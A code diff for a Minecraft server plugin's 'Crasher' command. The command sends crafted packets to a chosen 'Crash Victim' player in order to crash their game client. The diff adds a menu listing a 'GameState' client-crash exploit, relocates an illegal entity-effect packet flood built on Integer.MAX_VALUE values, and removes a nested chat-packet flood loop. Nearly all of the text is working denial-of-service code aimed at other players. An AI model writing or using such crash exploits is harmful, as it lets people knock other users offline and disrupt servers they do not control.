@@ -1,8 +1,15 @@
 package me.killstorm103.Rebug.Commands;
 
 import java.util.ArrayList;
+
+import org.bukkit.Bukkit;
+import org.bukkit.ChatColor;
+import org.bukkit.Material;
 import org.bukkit.command.CommandSender;
 import org.bukkit.entity.Player;
+import org.bukkit.inventory.Inventory;
+import org.bukkit.inventory.ItemStack;
+import org.bukkit.inventory.meta.ItemMeta;
 
 import io.netty.buffer.Unpooled;
 import me.killstorm103.Rebug.Main.Command;
@@ -19,7 +26,7 @@ public class Crasher extends Command
 
 	@Override
 	public String getSyntax() {
-		return "crash <Crash Exploit> <Crash Victim> ...";
+		return "crash <Crash Exploit or 'menu'> <Crash Victim> ...";
 	}
 
 	@Override
@@ -30,7 +37,7 @@ public class Crasher extends Command
 	public String getPermission() {
 		return StartOfPermission() + "crasher";
 	}
-	
+	private ArrayList<String> lore = new ArrayList<>();
 	@Override
 	public void onCommand(CommandSender sender, String[] args) throws Exception 
 	{
@@ -44,6 +51,27 @@ public class Crasher extends Command
 		if (mode == null || mode.length() < 1)
 		{
 			Log(sender, getSyntax());
+			return;
+		}
+		if (mode.equalsIgnoreCase("menu") && sender instanceof Player)
+		{
+			Player player = (Player) sender;
+			lore.clear();
+			
+			// Size can be: 9, 18, 27, 36, 45, 54
+			Inventory inventory = Bukkit.createInventory(player, 9, ChatColor.DARK_RED + "Crashers");
+			
+			inventory.clear();
+			ItemStack item = new ItemStack(Material.CLAY);
+			ItemMeta meta = item.getItemMeta();
+			meta.setDisplayName(ChatColor.RED + "GameState");
+			lore.add("GameState Exploit!");
+			lore.add("Crashes the client");
+			meta.setLore(lore);
+			item.setItemMeta(meta);
+			inventory.setItem(0, item);
+			
+			player.openInventory(inventory);
 			return;
 		}
 		Packet<?> packet = null;
@@ -62,21 +90,6 @@ public class Crasher extends Command
 		if (mode.equalsIgnoreCase("Server")) // Test in dev
 		{
 			Log(sender, "trying Server Crasher!");
-			for (int i = 0; i < Integer.MAX_VALUE; i ++)
-			{
-				ChatComponentText text = new ChatComponentText(PT.randomString(Integer.MAX_VALUE) + " " + i);
-				for (int o = 0; o < Integer.MAX_VALUE; o ++)
-				{
-					packet = new PacketPlayOutChat (text, (byte) 1);
-					PT.SendPacket(Crash_Victim, packet);
-				}
-				
-				for (int p = 0; p < Integer.MAX_VALUE; p ++)
-				{
-					packet = new PacketPlayOutChat (text, (byte) 2);
-					PT.SendPacket(Crash_Victim, packet);
-				}
-			}
 		}
 		if (mode.equalsIgnoreCase("NumbWare"))
 		{
@@ -125,6 +138,14 @@ public class Crasher extends Command
 			}
 			Log(sender, "tried crashing " + Crash_Victim.getName());
 		}
+		if (mode.equalsIgnoreCase("illegalEffect") || mode.equalsIgnoreCase("Effect"))
+		{
+			packet = new PacketPlayOutEntityEffect (Crash_Victim.getEntityId(), new MobEffect(Integer.MAX_VALUE, Integer.MAX_VALUE, Integer.MAX_VALUE, true, true));
+			for (int i = 0; i < Integer.MAX_VALUE; i++)
+				PT.SendPacket(Crash_Victim, packet);
+			
+			Log(sender, "trying to use test crash Exploit on " + Crash_Victim.getName());
+		}
 		if (mode.equalsIgnoreCase("SpawnEntity") || mode.equalsIgnoreCase("Entity"))
 		{
 			if (args.length < 3)
@@ -133,14 +154,6 @@ public class Crasher extends Command
 				return;
 			}
 			PT.CrashPlayer(sender, Crash_Victim, args[3]);
-			Log(sender, "tried crashing " + Crash_Victim.getName());
-		}
-		if (mode.equalsIgnoreCase("illegalEffect") || mode.equalsIgnoreCase("Effect"))
-		{
-			packet = new PacketPlayOutEntityEffect (Crash_Victim.getEntityId(), new MobEffect(Integer.MAX_VALUE, Integer.MAX_VALUE, Integer.MAX_VALUE, true, true));
-			for (int i = 0; i < Integer.MAX_VALUE; i++)
-				PT.SendPacket(Crash_Victim, packet);
-			
 			Log(sender, "tried crashing " + Crash_Victim.getName());
 		}
 	}
